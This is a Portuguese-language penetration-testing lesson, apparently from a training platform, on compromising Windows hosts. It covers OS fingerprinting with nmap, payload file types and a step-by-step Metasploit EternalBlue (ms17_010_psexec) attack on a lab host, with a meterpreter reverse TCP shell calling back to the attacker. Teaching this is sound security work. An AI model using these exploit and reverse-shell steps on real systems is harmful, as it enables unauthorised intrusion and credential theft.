Como muitos de nós se lembram, a Microsoft dominou os mercados doméstico e corporativo da computação. Nos dias modernos, com a introdução de recursos aprimorados do Active Directory, mais interconectividade com serviços em nuvem, subsistema Windows para Linux e muito mais, a superfície de ataque da Microsoft também aumentou.

Por exemplo, apenas nos últimos cinco anos, houve `3688` vulnerabilidades relatadas apenas nos produtos da Microsoft, e esse número cresce diariamente. Esta tabela foi derivada de [AQUI](https://www.cvedetails.com/vendor/26/Microsoft.html)

![[Pasted image 20230704205338.png]]

## Explorações proeminentes do Windows

Nos últimos anos, várias vulnerabilidades no sistema operacional Windows e seus ataques correspondentes são algumas das vulnerabilidades mais exploradas do nosso tempo. Vamos discutir isso por um minuto:

|**Vulnerabilidade**|**Descrição**|
|---|---|
|`MS08-067`|O MS08-067 foi um patch crítico enviado para muitas revisões diferentes do Windows devido a uma falha no SMB. Essa falha tornou extremamente fácil se infiltrar em um host do Windows. Era tão eficiente que o verme Conficker o usava para infectar todos os hospedeiros vulneráveis que encontrava. Até o Stuxnet aproveitou essa vulnerabilidade.|
|`Eternal Blue`|MS17-010 é uma façanha vazada no depósito de Shadow Brokers da NSA. Essa exploração foi usada principalmente nos ataques cibernéticos WannaCry e NotPetya. Esse ataque aproveitou uma falha no protocolo SMB v1, permitindo a execução do código. Acredita-se que o EternalBlue tenha infectado mais de 200.000 hosts apenas em 2017 e ainda é uma maneira comum de encontrar acesso a um host vulnerável do Windows.|
|`PrintNightmare`|Uma vulnerabilidade de execução remota de código no Windows Print Spooler. Com credenciais válidas para esse host ou um shell de baixo privilégio, você pode instalar uma impressora, adicionar um driver que seja executado para você e conceder acesso no nível do sistema ao host. Essa vulnerabilidade tem devastado as empresas até 2021. 0xdf escreveu um post incrível [aqui](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).|
|`BlueKeep`|O CVE 2019-0708 é uma vulnerabilidade no protocolo RDP da Microsoft que permite a execução remota de código. Essa vulnerabilidade aproveitou um canal chamado incorretamente para obter a execução do código, afetando todas as revisões do Windows do Windows 2000 ao Server 2008 R2.|
|`Sigred`|O CVE 2020-1350 utilizou uma falha na maneira como o DNS lê os registros de recursos do SIG. É um pouco mais complicado do que as outras explorações desta lista, mas se feito corretamente, ele dará ao invasor privilégios de administrador de domínio, pois afetará o servidor DNS do domínio, que geralmente é o controlador de domínio principal.|
|`SeriousSam`|O CVE 2021-36924 explora um problema com a maneira como o Windows lida com a permissão na pasta `C:\Windows\system32\config`. Antes de corrigir o problema, usuários não elevados têm acesso ao banco de dados SAM, entre outros arquivos. Esse não é um grande problema, pois os arquivos não podem ser acessados enquanto estão em uso pelo PC, mas isso fica perigoso ao analisar os backups de cópias de sombra de volume. Esses mesmos erros de privilégio também existem nos arquivos de backup, permitindo que um invasor leia o banco de dados do SAM, despejando credenciais.|
|`Zerologon`|O CVE 2020-1472 é uma vulnerabilidade crítica que explora uma falha criptográfica no Protocolo Remoto de Netlogon do Active Directory da Microsoft ( MS-NRPC ). Ele permite que os usuários efetuem logon nos servidores usando o NT LAN Manager ( NTLM ) e até enviem alterações de conta através do protocolo. O ataque pode ser um pouco complexo, mas é trivial executar, pois um invasor teria que fazer cerca de 256 palpites na senha de uma conta de computador antes de encontrar o que precisava. Isso pode acontecer em questão de alguns segundos.|

Com essas vulnerabilidades em mente, o Windows não vai a lugar nenhum. Precisamos ser proficientes na identificação de vulnerabilidades, exploração e movimentação de hosts e ambientes do Windows. Uma compreensão desses conceitos também pode nos ajudar a proteger nossos ambientes contra ataques. Agora é hora de mergulhar e explorar alguma diversão de exploração focada no Windows.

## Enumerando métodos de fingerprinting e Windows

Este módulo pressupõe que você já executou a fase de enumeração do host e entende quais serviços são comumente vistos nos hosts. Estamos apenas tentando fazer alguns truques rápidos para determinar se um host provavelmente é uma máquina Windows. Confira o módulo [Enumeração de rede com NMAP](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) para uma análise mais detalhada da enumeração e fingerprinting do host.

Como temos um conjunto de metas, `what are a few ways to determine if the host is likely a Windows Machine`? Para responder a essa pergunta, podemos ver algumas coisas. O primeiro sendo o `Time To Live` Contador ( TTL ) ao utilizar o ICMP para determinar se o host está ativo. Uma resposta típica de um host do Windows será 32 ou 128. Uma resposta de ou cerca de 128 é a resposta mais comum que você verá. Esse valor nem sempre pode ser exato, especialmente se você não estiver na mesma camada três da rede que o destino. Podemos utilizar esse valor, pois a maioria dos hosts nunca estará a mais de 20 saltos do seu ponto de origem, portanto, há poucas chances de o contador TTL cair nos valores aceitáveis de outro tipo de sistema operacional. Na saída de ping abaixo, podemos ver um exemplo disso. Por exemplo, tocamos um host do Windows 10 e podemos ver que recebemos respostas com um TTL de 128. Confira isso [ligação](https://subinsb.com/default-device-ttl-values/) para uma boa tabela mostrando outros valores TTL pelo sistema operacional.

```shell-session
casluxd@htb[/htb]$ ping 192.168.86.39 

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

Outra maneira de validar se o host é ou não do Windows é usar nossa ferramenta útil, `NMAP`. O Nmap possui um recurso interessante incorporado para ajudar na identificação do sistema operacional e em muitas outras verificações com script para verificar se há algo que não seja uma vulnerabilidade específica às informações coletadas do SNMP. Para este exemplo, utilizaremos o `-O` opção com saída verbosa `-v` para inicializar uma verificação de identificação do sistema operacional em relação ao nosso destino `192.168.86.39`. À medida que percorremos a sessão do shell abaixo e analisamos os resultados, algumas coisas revelam isso como um host do Windows. Vamos nos concentrar naqueles aqui em um minuto. Olhe atentamente para a parte inferior da sessão do shell. Podemos ver o ponto rotulado `OS CPE: cpe:/o:microsoft:windows_10` e `OS details: Microsoft Windows 10 1709 - 1909`. O Nmap fez esse palpite com base em várias métricas diferentes que derivam da pilha TCP / IP. Ele usa essas qualidades para determinar o sistema operacional, pois o verifica em um banco de dados de fingerprinting do sistema operacional. Nesse caso, o Nmap determinou que nosso host é uma máquina Windows 10 com um nível de revisão entre 1709 e 1909.

Se você tiver problemas e as verificações apresentarem poucos resultados, tente novamente com o `-A` e `-Pn` opções. Isso executará uma verificação diferente e poderá funcionar. Para mais informações sobre como esse processo funciona, confira este artigo no [Documentação Nmap](https://nmap.org/book/man-os-detection.html). Tenha cuidado com este método de detecção. A implementação de um firewall ou outros recursos de segurança pode obscurecer o host ou atrapalhar os resultados. Quando possível, use mais de uma verificação para fazer uma determinação.

#### Varredura de detecção do sistema

```shell-session
casluxd@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
```

Agora que sabemos que estamos lidando com um host do Windows 10, precisamos enumerar os serviços que podemos ver para determinar se temos uma via potencial de exploração. Para executar a captura de banner, podemos usar várias ferramentas diferentes. Netcat, Nmap e muitos outros podem executar a enumeração de que precisamos, mas, neste caso, veremos um script Nmap simples chamado `banner.nse`. Para cada porta que o Nmap vê como alta, ele tentará se conectar à porta e recolher todas as informações que puder. Na sessão abaixo, o Nmap tentou se conectar a cada porta, mas as únicas portas para devolver uma resposta foram as portas 902 e 912. Com base no banner da página, eles têm algo a ver com o VMWare Workstation. Podemos tentar encontrar uma exploração que lide com esse protocolo ou podemos enumerar ainda mais as outras portas. Em um verdadeiro pentest, você desejará ser o mais completo possível, certificando-se de ter toda a configuração da terra.

#### Faixa de captura para enumerar portas

```shell-session
casluxd@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```

Os exemplos mostrados acima são apenas algumas maneiras de ajudar o fingerprinting e determinar se um host é uma máquina Windows. Não é de forma alguma uma lista exaustiva, e há muitas outras verificações que você pode fazer. Agora que discutimos fingerprinting, vejamos vários tipos de arquivos e para que eles podem ser usados ao criar cargas úteis.

## Bats, DLLs, & MSI Files, Oh My!

Quando se trata de criar cargas úteis para hosts do Windows, temos muitas opções para escolher. DLLs, arquivos em lote, pacotes MSI e até scripts PowerShell são alguns dos métodos mais comuns para usar. Cada tipo de arquivo pode realizar coisas diferentes para nós, mas o que todos eles têm em comum é que eles são executáveis em um host. Tente manter em mente o mecanismo de entrega da carga útil, pois isso pode determinar que tipo de carga útil você usa.

#### Tipos de carga útil a serem considerados

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) Uma biblioteca de vinculação dinâmica ( DLL ) é um arquivo de biblioteca usado nos sistemas operacionais da Microsoft para fornecer código e dados compartilhados que podem ser usados por muitos programas diferentes ao mesmo tempo. Esses arquivos são modulares e permitem que tenhamos aplicativos mais dinâmicos e fáceis de atualizar. Como um pentista, injetar uma DLL maliciosa ou seqüestrar uma biblioteca vulnerável no host pode elevar nossos privilégios ao SYSTEM e / ou ignorar os Controles de Conta de Usuário.
- [Batch](https://commandwindows.com/batch.htm) Arquivos em lote são scripts DOS baseados em texto utilizados pelos administradores do sistema para concluir várias tarefas através do intérprete de linha de comando. Esses arquivos terminam com uma extensão de `.bat`. Podemos usar arquivos em lote para executar comandos no host de maneira automatizada. Por exemplo, podemos ter um arquivo em lote aberto uma porta no host ou conectar-se à nossa caixa de ataque. Feito isso, ele pode executar etapas básicas de enumeração e fornecer informações sobre a porta aberta.
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) O VBScript é uma linguagem de script leve baseada no Visual Basic da Microsoft. Normalmente, é usado como uma linguagem de script do lado do cliente em servidores da web para ativar páginas da web dinâmicas. O VBS é datado e desativado pela maioria dos navegadores da web modernos, mas vive no contexto de Phishing e outros ataques que visam que os usuários executem uma ação, como permitir o carregamento de macros em um documento do excel ou clicando em uma célula para que o mecanismo de script do Windows execute um pedaço de código.
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) os arquivos `.MSI` servem como um banco de dados de instalação para o Windows Installer. Ao tentar instalar um novo aplicativo, o instalador procurará o arquivo .msi para entender todos os componentes necessários e como encontrá-los. Podemos usar o Windows Installer criando uma carga útil como um arquivo .msi. Depois de colocá-lo no host, podemos executar `msiexec` executar nosso arquivo, o que nos fornecerá acesso adicional, como um shell reverso elevado.
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell é um ambiente de shell e uma linguagem de script. Serve como o ambiente moderno de shell da Microsoft em seus sistemas operacionais. Como linguagem de script, é uma linguagem dinâmica baseada no tempo de execução do linguagem .NET que, como seu componente de shell, recebe entrada e saída objetos .NET. O PowerShell pode nos fornecer uma infinidade de opções quando se trata de obter um shell e execução em um host, entre muitas outras etapas do nosso processo de teste de penetração.

Agora que entendemos para que cada tipo de arquivo do Windows pode ser usado, vamos discutir algumas ferramentas, táticas básicas, e procedimentos para construir nossas cargas úteis e entregá-las ao host para pousar uma concha.

## Ferramentas, táticas e procedimentos para geração, transferência e execução de carga útil

Abaixo, você encontrará exemplos de diferentes métodos de geração de carga útil e maneiras de transferir nossas cargas úteis para a vítima. Falaremos sobre alguns desses métodos em um nível alto, pois nosso foco está na própria geração de carga útil e nas diferentes maneiras de adquirir um shell no alvo.

#### Geração de carga útil

Temos muitas boas opções para lidar com a geração de cargas úteis para usar em hosts do Windows. Nós tocamos em alguns deles já nas seções anteriores. Por exemplo, o Metasploit-Framework e o MSFVenom são uma maneira muito prática de gerar cargas úteis, pois são agnósticos do sistema operacional. A tabela abaixo apresenta algumas de nossas opções. No entanto, essa não é uma lista exaustiva e novos recursos são divulgados diariamente.

|**Recurso**|**Descrição**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[Fonte](https://github.com/rapid7/metasploit-framework) MSF é uma ferramenta extremamente versátil para o kit de ferramentas de qualquer pentador. Ele serve como uma maneira de enumerar hosts, gerar cargas úteis, utilizar explorações públicas e personalizadas e executar ações pós-exploração uma vez no host. Pense nisso como uma faca de exército suíço.|
|`Payloads All The Things`|[Fonte](https://github.com/swisskyrepo/PayloadsAllTheThings) Aqui, você pode encontrar muitos recursos e folhas de dicas diferentes para geração de carga útil e metodologia geral.|
|`Mythic C2 Framework`|[Fonte](https://github.com/its-a-feature/Mythic) A estrutura Mythic C2 é uma opção alternativa ao Metasploit como uma estrutura de comando e controle e caixa de ferramentas para geração exclusiva de carga útil.|
|`Nishang`|[Fonte](https://github.com/samratashok/nishang) Nishang é uma coleção de estrutura de implantes e scripts ofensivos PowerShell. Inclui muitos utilitários que podem ser úteis para qualquer pentista.|
|`Darkarmour`|[Fonte](https://github.com/bats3c/darkarmour) Darkarmour é uma ferramenta para gerar e utilizar binários ofuscados para uso em hosts do Windows.|

#### Transferência e Execução de Payload:

Além dos vetores de e-mails de phishing ou dead drive-by na Web, os hosts do Windows podem nos fornecer várias outras vias de entrega de carga útil. A lista abaixo inclui algumas ferramentas e protocolos úteis para uso ao tentar descartar uma carga útil em um destino.

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): é um ótimo recurso para encontrar oneliners rápidos para ajudar a transferir arquivos pelos hosts com rapidez.
- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) é embutido no conjunto de ferramentas que nos fornece uma maneira de interagir diretamente com os protocolos de rede. Algumas das ferramentas mais interessantes com as quais nos preocupamos no Impacket lidam com `psexec`, `smbclient`, `wmi`, Kerberos e a capacidade de suportar um servidor SMB.
- `SMB`: O SMB pode fornecer uma rota fácil de explorar para transferir arquivos entre hosts. Isso pode ser especialmente útil quando os hosts da vítima são unidos ao domínio e utilizam compartilhamentos para hospedar dados. Nós, como invasores, podemos usar esses compartilhamentos de arquivos SMB junto com C$ e admin$ para hospedar e transferir nossas cargas úteis e até mesmo extinguir dados pelos links.
- `Remote execution via MSF`: Incorporado a muitos dos módulos de exploração no Metasploit, há uma função que cria, encena e executa as cargas úteis automaticamente.
- `Other Protocols`: Ao olhar para um host, protocolos como FTP, TFTP, HTTP / S e muito mais podem fornecer uma maneira de fazer upload de arquivos para o host. Enumere e preste atenção às funções abertas e disponíveis para uso.

Agora que sabemos quais ferramentas, táticas e procedimentos podemos usar para transferir nossas cargas úteis, vamos dar uma olhada em um exemplo de processo de compromisso.

## Exemplo de passo a passo do compromisso

1. Enumerar o host

As varreduras de Ping, Netcat, Nmap e até Metasploit são boas opções para começar a enumerar nossas vítimas em potencial. Para começar desta vez, utilizaremos uma verificação do Nmap. A parte de enumeração de qualquer cadeia de exploração é sem dúvida a peça mais crítica do quebra-cabeça. Compreender o alvo e o que o faz funcionar aumentará suas chances de ganhar uma concha.

#### Enumerar o host

```shell-session
casluxd@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29

```

Descobrimos algumas coisas durante a digitalização e validação do exemplo de host em questão. Está funcionando `Windows Server 2016 Standard 6.3`. Temos o nome do host agora e sabemos que ele não está em um domínio e está executando vários serviços. Agora que coletamos algumas informações, vamos determinar nosso caminho potencial de exploração.  
`IIS` poderia ser um caminho em potencial, tentando acessar o host pelo SMB utilizando uma ferramenta como o Impacket ou autenticando se tivéssemos credenciais, e do ponto de vista do sistema operacional, também pode haver uma rota para um RCE. Sabe-se que o MS17-010 ( EternalBlue ) afeta hosts que variam do Windows 2008 ao Server 2016. Com isso em mente, pode ser uma aposta sólida que nossa vítima seja vulnerável, pois cai nessa janela. Vamos validar isso usando uma verificação auxiliar incorporada de `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.

2. Pesquise e decida um caminho de exploração

Abrir `msfconsole` e procure EternalBlue, ou você pode usar a string na sessão abaixo para usar a verificação. Defina o campo RHOSTS com o endereço IP do destino e inicie a verificação. Como pode ser visto nas opções para o módulo, você pode preencher mais configurações do SMB, mas isso não é necessário. Eles ajudarão a aumentar a probabilidade de sucesso do cheque. Quando estiver pronto, digite `run`.

#### Determinar um caminho de exploração

```shell-session
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Agora, podemos ver nos resultados da verificação que nosso objetivo provavelmente está vulnerável ao EternalBlue. Vamos configurar a exploração e a carga útil agora e tentar.

3. Selecione Explorar e Carregar Carga, em seguida, Entregar

#### Escolha e configure nossa exploração e carga útil

```shell-session
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Nesse caso, examinamos os módulos de exploração de MSF utilizando a função de pesquisa para procurar uma exploração correspondente ao EternalBlue. A lista acima foi o resultado. Desde que tive mais sorte com o `psexec` versão dessa façanha, tentaremos essa primeiro. Vamos escolher e continuar a configuração.

#### Configurar a exploração e carga útil

```shell-session
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Certifique-se de definir suas opções de carga útil corretamente antes de executar a exploração. Quaisquer opções que tenham `Required` definido como sim será um espaço necessário para preencher. Nesse caso, precisamos garantir que nossos `RHOSTS, LHOST, and LPORT` os campos estão definidos corretamente. Para esta tentativa, aceitar os padrões para o resto é bom.

#### Validar nossas opções

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Desta vez, mantivemos as coisas simples e apenas usamos um `windows/meterpreter/reverse_tcp` carga útil. Você pode alterar isso conforme desejar para um tipo de shell diferente ou ofuscar mais seu ataque, conforme mostrado nas seções anteriores de cargas úteis. Com nossas opções definidas, vamos tentar e ver se obtemos uma shell.

4. Execute o ataque e receba um retorno de chamada.

#### Execute nosso ataque

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

Sucesso! Conseguimos nossa façanha e ganhamos uma sessão de concha. A `SYSTEM` nível de shell nisso. Como visto nos módulos anteriores de MSF, agora que temos uma sessão aberta através do Meterpreter, somos apresentados a `meterpreter >` prompt. A partir daqui, podemos utilizar o Meterpreter para executar outros comandos para coletar informações do sistema, roubar credenciais do usuário ou usar outro módulo de pós-exploração contra o host. Se você deseja interagir diretamente com o host, também pode participar de uma sessão interativa no shell no host do Meterpreter.

5. Identifique o Shell nativo.

#### Identifique nosso shell

```shell-session
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Quando executamos o comando Meterpreter `shell`, iniciou outro processo no host e nos colocou em um shell do sistema. Você pode determinar o que estamos fazendo no prompt? Apenas vendo `C:\Windows\system32>` pode nos dar uma pista de que estamos apenas em um `cmd.exe shell`. Para ter certeza, basta executar a ajuda de comando de dentro do shell também informará você. Se fôssemos lançados no PowerShell, nosso prompt seria como `PS C:\Windows\system32>`. O PS na frente nos informa que é uma sessão do PowerShell. Parabéns por ter encontrado um shell no nosso host mais recente explorado do Windows.

Agora que passamos por um processo de compromisso de amostra, vamos examinar as conchas que você pode ver quando pousar no hospedeiro.

---

## CMD-Prompt e Power [ Shell ] s para Diversão e Lucro.

Temos a sorte de os hosts do Windows não terem uma, mas duas opções para os shells utilizarem por padrão. Agora você pode estar se perguntando:

`Which one is the right one to use?`

A resposta é simples, aquela que fornece o recurso necessário no momento. Comparar `cmd` e `PowerShell` por um minuto para ter uma noção do que eles oferecem e quando seria melhor escolher um sobre o outro.

